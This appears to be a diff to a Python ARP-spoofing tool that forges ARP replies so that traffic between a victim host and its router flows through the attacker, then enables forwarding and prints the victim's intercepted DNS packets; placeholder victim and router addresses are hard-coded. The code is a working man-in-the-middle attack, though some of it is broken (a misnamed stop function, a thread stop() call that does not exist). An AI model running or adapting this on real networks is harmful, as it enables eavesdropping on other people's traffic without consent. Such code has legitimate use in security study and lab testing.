@@ -14,35 +14,50 @@ def forge_arp_response(rcv_ip, rcv_mac, res_ip, res_mac):
 def poison_loop(pkt, interface, interval):
 	sendp(pkt, iface=interface, loop=1, inter=interval)
 	
-def start_arp_mitm(victim_ip, victim_mac, router_ip, router_mac, self_mac):
-	poison_victim = forge_arp_response(victim_ip, victim_mac, router_ip, self_mac)
-	poison_router = forge_arp_response(router_ip, router_mac, victim_ip, self_mac)
+def start_arp_mitm(src_ip, src_mac, dst_ip, dst_mac, self_mac, interface):
+	poison_src = forge_arp_response(src_ip, src_mac, dst_ip, self_mac)
+	poison_dst = forge_arp_response(dst_ip, dst_mac, src_ip, self_mac)
     
-	victim_thread = threading.Thread(target=poison_loop, args=(poison_victim, "eth0", 20), daemon=True)
-	router_thread = threading.Thread(target=poison_loop, args=(poison_router, "eth0", 20), daemon=True) # todo add ways to customise intervals / interfaces
+	src_thread = threading.Thread(target=poison_loop, args=(poison_src, interface, 20), daemon=True)
+	dst_thread = threading.Thread(target=poison_loop, args=(poison_dst, interface, 20), daemon=True) # todo add ways to customise intervals / interfaces
 	
-	victim_thread.start()
-	router_thread.start()
+	src_thread.start()
+	dst_thread.start()
 	
-	return [victim_thread, router_thread]
-    
-    # todo add custom function to stop mitm 
-    # todo find good timings for sending poison/stealth mode(?)
+	return [src_thread, dst_thread]
+
+    # todo find good timings for sending poison/stealth mode(?) (base on OS?)
 
     
-def stop_arp_mittm():
-	pass # todo
+def stop_arp_mittm(threads):
+	threads[0].stop()
+	threads[1].stop()
+	
+def only_dns(pkt):
+    	if pkt.haslayer(UDP):
+        	if pkt.haslayer(DNS):
+            		print(pkt.summary())
 
-start_arp_mitm("192.168.1.101", "00:0c:29:20:af:e4", "192.168.1.1", "00:0c:29:94:84:aa" , "00:0c:29:97:ee:06")
+	
+# placeholder
+victim_ip = "192.168.1.101"
+victim_mac = "00:0c:29:5c:dd:75"
+router_ip = "192.168.1.1"
+router_mac = "00:0c:29:9a:aa:86"
+self_ip = "192.168.1.100"
+self_mac = "00:0c:29:c0:d0:fc"
 
-def test(src_ip, dst_mac):
-	while True:
-		capture_and_forward(src_ip, dst_mac, "00:0c:29:97:ee:06", "eth0", print)
-t1 = threading.Thread(target=test, args=("192.168.1.101", "00:0c:29:94:84:aa"), daemon=True)
-t2 = threading.Thread(target=test, args=("192.168.1.1", "00:0c:29:20:af:e4"), daemon=True)
+enable_kernel_forwarding("eth0")
 
-#t1.start()
-#t2.start()
-#enable_forwarding()
-start_kernel_forwarding("192.168.1.1", "192.168.1.101", "192.168.1.102", "eth0")
-input("stop")
+threads = start_arp_mitm(victim_ip, victim_mac, router_ip, router_mac , self_mac, "eth0")
+
+def print_fn(pkt):
+	print(pkt[Ether].src)
+	print(pkt.summary())
+	
+intercept_pkts(victim_ip, self_mac, "eth0", only_dns, print_fn)
+
+input("\nstop")
+
+stop_arp_mitm(threads)
+cleanup_forward("eth0")
